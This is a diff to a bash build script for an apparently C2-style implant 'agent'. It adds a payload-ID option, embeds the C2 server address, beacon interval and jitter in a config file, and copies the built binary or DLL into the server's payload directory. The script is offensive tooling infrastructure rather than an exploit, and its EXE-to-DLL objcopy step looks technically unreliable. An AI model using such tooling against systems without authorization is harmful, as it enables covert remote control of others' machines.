@@ -12,6 +12,7 @@ LISTENER_PORT=""
 SLEEP_INTERVAL=60
 JITTER=2
 FORMAT=""
+PAYLOAD_ID=""   # New variable to accept server-generated UUID
 
 # Parse command line arguments
 while [[ $# -gt 0 ]]; do
@@ -48,6 +49,10 @@ while [[ $# -gt 0 ]]; do
       JITTER="$2"
       shift 2
       ;;
+    --payload-id)
+      PAYLOAD_ID="$2"
+      shift 2
+      ;;   # New case for payload ID
     *)
       echo "Unknown option: $1"
       shift
@@ -76,23 +81,32 @@ fi
 # Ensure the port is explicitly set
 SERVER_PORT=${LISTENER_PORT:-8080}
 
-# IMPORTANT: Don't override OUTPUT_DIR if it's explicitly provided
-# This ensures we use the exact path specified by the server
-if [ -z "$OUTPUT_DIR" ]; then
-    OUTPUT_DIR="../server/static/agents"
-else
-    # Preserve the exact output path passed in
-    echo "Using specified output directory: $OUTPUT_DIR"
-fi
+# Store original output dir (as provided by the server)
+ORIGINAL_OUTPUT_DIR="$OUTPUT_DIR"
 
-# Make OUTPUT_DIR absolute path to avoid issues
+# Handle relative/absolute paths
 if [[ "$OUTPUT_DIR" != /* ]]; then
+    # If relative path, make it absolute from current directory
     OUTPUT_DIR="$(pwd)/$OUTPUT_DIR"
 fi
+
+# Determine payload ID if not provided
+if [ -z "$PAYLOAD_ID" ]; then
+    PAYLOAD_ID=$(basename "$OUTPUT_DIR")
+    echo "Detected Payload ID: $PAYLOAD_ID"
+else
+    echo "Using provided payload ID: $PAYLOAD_ID"
+fi
+
+# Also figure out the server's full path
+SERVER_DIR=$(dirname $(dirname "$OUTPUT_DIR"))
+echo "Server path: $SERVER_DIR"
 
 echo "Configuration:"
 echo "  Target:       $TARGET"
 echo "  Output Dir:   $OUTPUT_DIR"
+echo "  Original Dir: $ORIGINAL_OUTPUT_DIR"
+echo "  Server Dir:   $SERVER_DIR"
 echo "  Build Type:   $BUILD_TYPE"
 echo "  C2 Server:    ${SERVER_IP}:${SERVER_PORT}"
 echo "  Sleep:        ${SLEEP_INTERVAL:-60} seconds"
@@ -120,12 +134,13 @@ echo "Building agent..."
 # Create output directory if it doesn't exist
 mkdir -p "$OUTPUT_DIR"
 
-# Create config file with explicit server URL and port
+# Create config file with explicit server URL and port and payload ID
 cat > "$OUTPUT_DIR/config.json" << EOF
 {
     "server_url": "${SERVER_IP}:${SERVER_PORT}",
     "sleep_interval": ${SLEEP_INTERVAL:-60},
-    "jitter": ${JITTER:-2}
+    "jitter": ${JITTER:-2},
+    "payload_id": "${PAYLOAD_ID}"
 }
 EOF
 
@@ -200,8 +215,7 @@ fi
 
 echo "Build complete in $BUILD_DIR"
 
-# Copy the binary to the output directory - FIXED to place in exact location
-# This ensures the server can find it where it's expecting it
+# Copy the binary to the output directory
 if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
     echo "Copying agent binary to output directory: $OUTPUT_DIR/agent$BINARY_EXT"
     cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent$BINARY_EXT"
@@ -210,6 +224,21 @@ if [ -f "$BUILD_DIR/agent$BINARY_EXT" ]; then
     cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/$(date +%Y%m%d%H%M%S)_agent$BINARY_EXT"
     
     echo "Agent binary copied successfully to specified output location"
+    
+    # IMPORTANT: Copy config.json to a location relative to the agent binary
+    # This ensures the agent can find its config regardless of where it's run from
+    echo "Embedding config.json with agent binary"
+    # This special directory naming scheme will help the agent find its config
+    mkdir -p "$OUTPUT_DIR/.config"
+    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
+    
+    # IMPORTANT: Also copy the agent to the server's expected location
+    echo "Copying agent to server's expected location: $ORIGINAL_OUTPUT_DIR/agent$BINARY_EXT"
+    mkdir -p "$(dirname "$ORIGINAL_OUTPUT_DIR")"
+    cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent$BINARY_EXT"
+    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/config.json"
+    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
+    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
 else
     echo "WARNING: agent binary not found at expected location: $BUILD_DIR/agent$BINARY_EXT"
     # List directory contents to aid debugging
@@ -233,6 +262,16 @@ if [ "$FORMAT" == "windows_dll" ]; then
                 
                 # Ensure the DLL is copied directly to the output directory to avoid path mismatch issues
                 echo "Successfully created DLL at: $OUTPUT_DIR/agent.dll"
+                
+                # Also copy the config for DLL usage
+                mkdir -p "$OUTPUT_DIR/.config"
+                cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
+                
+                # Copy to server's expected location too
+                cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
+                mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
+                cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
+                
                 ls -la "$OUTPUT_DIR"
             else
                 # Convert EXE to DLL using objcopy
@@ -240,9 +279,25 @@ if [ "$FORMAT" == "windows_dll" ]; then
                     echo "Converting EXE to DLL using objcopy..."
                     objcopy --input-target=pe-x86-64 --output-target=pe-x86-64 --add-section .rdata="$BUILD_DIR/agent$BINARY_EXT" "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
                     echo "Successfully created DLL at: $OUTPUT_DIR/agent.dll"
+                    
+                    # Also copy to server's expected location
+                    objcopy --input-target=pe-x86-64 --output-target=pe-x86-64 --add-section .rdata="$BUILD_DIR/agent$BINARY_EXT" "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
+                    
+                    # Also copy the config for DLL usage
+                    mkdir -p "$OUTPUT_DIR/.config"
+                    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
+                    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
+                    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
                 else
                     echo "objcopy not found, copying executable as DLL..."
                     cp "$BUILD_DIR/agent$BINARY_EXT" "$OUTPUT_DIR/agent.dll"
+                    cp "$BUILD_DIR/agent$BINARY_EXT" "$ORIGINAL_OUTPUT_DIR/agent.dll"
+                    
+                    # Also copy the config for DLL usage
+                    mkdir -p "$OUTPUT_DIR/.config"
+                    cp "$OUTPUT_DIR/config.json" "$OUTPUT_DIR/.config/config.json"
+                    mkdir -p "$ORIGINAL_OUTPUT_DIR/.config"
+                    cp "$OUTPUT_DIR/config.json" "$ORIGINAL_OUTPUT_DIR/.config/config.json"
                 fi
             fi
         else
@@ -258,6 +313,10 @@ fi
 # Ensure all files are in the correct location
 echo "Final output directory contents:"
 ls -la "$OUTPUT_DIR"
+
+# Show the contents of the server directory as well
+echo "Server directory contents:"
+ls -la "$ORIGINAL_OUTPUT_DIR"
 
 # If we built a DLL, verify it exists in the output directory
 if [ "$FORMAT" == "windows_dll" ]; then
